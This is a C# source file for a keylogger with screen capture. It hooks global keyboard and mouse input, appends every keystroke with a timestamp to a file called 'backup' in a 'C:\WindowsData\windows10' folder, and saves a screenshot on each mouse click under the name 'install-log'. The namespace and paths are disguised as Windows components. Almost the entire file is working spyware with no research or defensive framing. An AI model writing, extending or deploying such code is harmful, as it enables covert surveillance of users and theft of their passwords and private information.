using EventHook;
using ScreenTest;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Microsoft_Windows
{
    class Program
    {
        static DirectoryInfo di;
        static DirectoryInfo di1;

        static void Main(string[] args)
        {
            var startTimeSpan = TimeSpan.Zero;
            var periodTimeSpan = TimeSpan.FromSeconds(5);

            int currentFileValue = getFileNumber();

            di = new DirectoryInfo("C:\\WindowsData");
            if (!di.Exists) { di.Create(); }
            di1 = new DirectoryInfo("C:\\WindowsData\\windows10");
            if (!di1.Exists) { di1.Create(); }


            var timer = new System.Threading.Timer((e) =>
            {
                GC.Collect();
            }, null, startTimeSpan, periodTimeSpan);



            PrintScreen ps = new PrintScreen();
            //  ps.CaptureScreenToFile(di + "\\data" + currentFileValue, System.Drawing.Imaging.ImageFormat.Jpeg);
            //    currentFileValue++;




            //Queue qt = new Queue();
            //Queue.enqueue(element);

            var eventHookFactory = new EventHookFactory();

            var keyboardWatcher = eventHookFactory.GetKeyboardWatcher();

            keyboardWatcher.Start();


            keyboardWatcher.OnKeyInput += (s, e) =>
            {
               // var dt = new DateTime(2010, 1, 1, 1, 1, 1, DateTimeKind.Utc);
                string time = string.Format("{0:yyyyMMdd HH:mm:ss.fff tt}", DateTime.Now);
                File.AppendAllText("C:\\WindowsData\\windows10\\backup", time + " - " + e.KeyData.Keyname + Environment.NewLine);
                // Debug.WriteLine("Key {0} event of key {1}", e.KeyData.EventType, e.KeyData.Keyname);
            };

            var mouseWatcher = eventHookFactory.GetMouseWatcher();
            mouseWatcher.Start();
            mouseWatcher.OnMouseInput += (s, e) =>
            {
                if (String.Equals(e.Message.ToString(), "WM_LBUTTONDOWN")) { ps.CaptureScreenToFile(di + "\\install-log" + currentFileValue, System.Drawing.Imaging.ImageFormat.Jpeg); currentFileValue++; }
                if (String.Equals(e.Message.ToString(), "WM_RBUTTONDOWN")) { ps.CaptureScreenToFile(di + "\\install-log" + currentFileValue, System.Drawing.Imaging.ImageFormat.Jpeg); currentFileValue++; }
                // if (String.Equals(e.Message.ToString(), "WM_MOUSEMOVE")) { Debug.WriteLine("XXXXXXXXXXXXXXXXXXXXXXXXX"); }
                //  Debug.WriteLine("Mouse event {0} at point {1},{2}", e.Message.ToString(), e.Point.x, e.Point.y);
            };


           // while (true) {
                System.Threading.Thread.Sleep(1000000);
            //}
           
        




            //    Thread t = new Thread(new ParameterizedThreadStart(StartupA));
            //    t.Start(new MyThreadParams(path, port));

            // You can also use an anonymous delegate to do this.
            //    Thread t2 = new Thread(delegate ()
            //    {
            //        StartupB(port, path);
            //    });
            //    t2.Start();

            // Or lambda expressions if you are using C# 3.0
            //   Thread t3 = new Thread(() => StartupB(port, path));
            //   t3.Start();

            // System.Threading.Thread.Sleep(5000);

            keyboardWatcher.Stop();
            mouseWatcher.Stop();

            eventHookFactory.Dispose();

        }







        static int getFileNumber() {

            di = new DirectoryInfo("C:\\WindowsData");
            if (!di.Exists) { di.Create(); }
            di1 = new DirectoryInfo("C:\\WindowsData\\windows10");
            if (!di1.Exists) { di1.Create(); }

            DirectoryInfo d = new DirectoryInfo("C:\\WindowsData");//Assuming Test is your Folder
            FileInfo[] Files = d.GetFiles(); //Getting Text files
            string str = "";

            int oldValue = 0;

            foreach (FileInfo file in Files)
            {


                // int value =int.Parse(file.Name.Replace("data",""));
                str = file.Name;
                //Debug.WriteLine("XXXXXXXXXXXXXXXXXXXXXXXXX" + str);
                str = str.Replace("install-log", "");
                //Debug.WriteLine("XXXXXXXXXXXXXXXXXXXXXXXXX" + str);
                int value = int.Parse(str);
                if (value > oldValue) { oldValue = value; }
            }


           // Debug.WriteLine("XXXXXXXXXXXXXXXXXXXXXXXXX" + oldValue);

            int x = oldValue + 1;
            return x;
        }
    }


}
